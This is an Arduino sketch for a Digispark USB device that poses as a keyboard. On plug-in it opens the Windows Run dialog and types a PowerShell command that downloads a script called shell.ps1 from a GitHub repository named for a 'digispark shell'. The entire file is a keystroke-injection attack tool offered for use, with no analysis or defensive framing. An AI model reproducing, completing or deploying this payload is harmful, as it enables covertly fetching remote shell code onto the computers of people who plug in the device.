#include "DigiKeyboardPtBr.h"

void setup()
{
    pinMode(1, OUTPUT);
    DigiKeyboardPtBr.sendKeyStroke(0);

    ledBlink(5);

    DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    ledBlink(8);

    DigiKeyboardPtBr.print("powershell (New-Object Net.WebClient).DownloadString('");
    DigiKeyboardPtBr.print("https://raw.githubusercontent.com/Louie-Cipher/digispark-shell/master/shell.ps1");
    DigiKeyboardPtBr.println("')");
}

void loop()
{
    ledBlink(1);
}

void ledBlink(int times)
{
    for (int i = 0; i < times; i++)
    {
        digitalWrite(1, HIGH);
        DigiKeyboardPtBr.delay(250);
        digitalWrite(1, LOW);
        DigiKeyboardPtBr.delay(250);
    }
}